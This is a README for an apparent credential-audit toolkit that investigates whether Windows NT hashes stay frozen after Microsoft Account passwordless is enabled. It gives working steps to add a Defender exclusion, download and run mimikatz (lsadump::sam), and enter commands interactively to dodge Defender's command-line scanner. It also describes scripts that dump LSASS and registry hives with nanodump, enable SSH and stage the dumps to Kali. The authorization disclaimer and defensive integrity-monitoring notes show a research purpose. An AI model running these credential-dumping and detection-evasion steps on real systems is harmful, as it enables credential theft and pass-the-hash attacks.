# Passwordless Credential Audit

> For use on systems you own or have explicit written authorization to test.

This repository investigates the NT hash security implications of enabling Microsoft Account passwordless authentication without a factory reset.

When passwordless authentication is enabled on a Microsoft Account **before** Windows setup, no password ever exists from the PC's perspective — Windows generates a random NT hash with no crackable plaintext behind it. This is the optimal security posture.

When passwordless authentication is enabled **after** setup on a system that authenticated with a Microsoft Account password, the NT hash derived from that password is frozen in the SAM indefinitely. It does not become random when passwordless is enabled — that requires a factory reset. Microsoft does not warn users of this. The frozen hash remains valid for pass-the-hash attacks regardless of the passwordless setting, and cannot be rotated without disabling passwordless authentication.

The tools in this repository dump and analyze the local credential state to verify which scenario a system is in, establishing whether the NT hash is a random value (secure) or a frozen derivative of a Microsoft Account password (exploitable).

---

## Mimikatz Dump

```powershell
Invoke-WebRequest "https://raw.githubusercontent.com/PentestPlaybook/passwordless-credential-audit/main/Add-TrustedFileExclusion.ps1" -OutFile "Add-TrustedFileExclusion.ps1" -UseBasicParsing
```

```powershell
.\Add-TrustedFileExclusion.ps1 -FilePath ".\mimikatz.exe" -URL "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip"
```

```powershell
.\mimikatz.exe
```

> **Note:** The following commands must be entered interactively within the mimikatz console. Passing them as command-line arguments triggers Defender's CmdLine scanner and results in immediate remediation regardless of file exclusions.

```
privilege::debug
```

```
log mimikatz.log
```

```
token::elevate
```

```
lsadump::sam
```

```
exit
```

```powershell
dir mimikatz.log
```

---

## Additional Dumps

```powershell
Invoke-WebRequest "https://raw.githubusercontent.com/PentestPlaybook/pentest-cheatsheets/main/hash-verification/dump-your-pc.ps1" -OutFile "dump-your-pc.ps1" -UseBasicParsing
```

```powershell
.\dump-your-pc.ps1
```

```powershell
dir *.save
dir *.dmp
```

---

## Scripts

### `Add-TrustedFileExclusion.ps1`

Downloads or locates a file, computes its hash for source verification, then applies a file-specific Defender exclusion and integrity monitoring. Supports direct URLs, GitHub blob URLs, and ZIP archives.

| Parameter | Required | Description |
|---|---|---|
| `-FilePath` | Yes | Full path to the file. Accepts a directory for direct file URLs — filename derived from URL. ZIP URLs require a full file path including the target filename to extract. |
| `-URL` | No | Download URL. GitHub blob/tree URLs converted to raw automatically. ZIP archives supported. |
| `-ExpectedHash` | No | Verifies hash matches a previously known value before prompting. |
| `-PagerIP` | No | Tailscale IP of the Pager - omit to skip notification. |
| `-PagerPort` | No | Pager netcat listener port (default: 9999). |

**Source verification:** Search by hash, not URL. Security research tools will show detections — this is expected. What matters is hash consistency against the official repository or release page.

**Note on directory exclusions:** This script adds a file-path exclusion, not a directory exclusion. A directory exclusion creates a trusted execution zone any file benefits from. A file-path exclusion trusts exactly one artifact.

---

### `dump-your-pc.ps1`

Dumps registry hives via `reg.exe` and LSASS via nanodump, enables SSH, and prints the exact `scp` commands to stage files to Kali. Prompts for the output drive at runtime — no hardcoded paths. All output logged to `<drive>\dump_log_<timestamp>.txt`.

---

### `Watch-FileIntegrity.ps1`

Polls registered file paths every 60 seconds and fires Pager and ntfy alerts when a file's SHA256 no longer matches its registered value. Hash-based rather than event-based — file replacement destroys SACLs before Event 4663 fires.

| Parameter | Required | Description |
|---|---|---|
| `-PagerIP` | Yes | Tailscale IP of the Pager. |
| `-NtfyURL` | Yes | URL of the self-hosted ntfy instance. |
| `-PagerPort` | No | Pager netcat listener port (default: 9999). |
| `-IntervalSeconds` | No | Poll interval in seconds (default: 60). |

---

### `Confirm-FileProtection.ps1`

Seven-point spot-check of all protection components on a registered file.

```powershell
.\Confirm-FileProtection.ps1 -FilePath "F:\nanodump.x64.exe"
```

---

### `soar_listener.sh`

Runs on the WiFi Pineapple Pager. Listens on TCP port 9999 and triggers DuckyScript ALERT + VIBRATE on incoming messages.

---

## LSASS Dump Test Scripts

Three batch files illustrating the distinction between signature detection and behavioral detection.

| Script | Signature blocked | Behavioral blocked | Works with exclusion |
|---|---|---|---|
| `lsass_nanodump.bat` | Yes — quarantined without exclusion | No | Yes |
| `lsass_procdump.bat` | No — legitimate Sysinternals tool | Yes — LSASS handle denied | No |
| `lsass_comsvcs.bat` | No — Windows system file | Yes — MiniDump on LSASS denied | No |

Procdump and nanodump are inverses of each other on the detection axes. All three accept an optional output path argument — defaults to the script directory if omitted.

---

## Security Design Notes

**Least privilege at the exclusion layer** — Exclusions are scoped to a single file path, not a directory. An attacker cannot use the exclusion as a trusted execution zone for other tools.

**Delete before trust** — The file does not exist on disk while the user verifies the hash. Re-downloaded and re-verified on Y before trust is applied.

**NTFS DACL write restriction** — Administrators full control, Users read-only. Removes the write path for standard users.

**TOCTOU mitigation** — Files set read-only immediately after the final verified download.

**Hash polling over event detection** — SHA256 polled every 60 seconds. File replacement destroys SACLs, making Event 4663 unreliable.

**Out-of-band notification** — Alerts route through the Pager and phone via TCP, independent of the Aurora's security state.
